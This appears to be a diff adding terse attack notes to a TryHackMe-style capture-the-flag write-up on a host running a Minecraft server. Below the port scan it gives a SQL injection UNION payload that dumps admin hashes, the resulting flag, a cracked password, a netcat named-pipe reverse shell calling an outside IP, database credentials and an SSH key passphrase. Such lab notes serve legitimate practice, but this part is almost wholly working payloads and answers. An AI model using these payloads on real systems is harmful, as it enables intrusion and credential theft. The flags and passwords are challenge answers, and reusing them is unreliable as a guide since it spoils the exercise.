@@ -28,3 +28,23 @@ PORT      STATE SERVICE   VERSION
 25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+test' UNION SELECT 1,id,user,hash FROM admin;#
+
+1 	xXUltimateCreeperXx 	88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
+4 	web_flag 	THM{bbe315906038c3a62d9b195001f75008}
+
+xXUltimateCreeperXx:diamond123456789
+
+
+
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6666 >/tmp/f
+
+
+$db_host = "localhost";
+$db_user = "root";
+$db_pwd = "";
+$db_name = "webapp";
+
+
+ssh key password: creepin2006
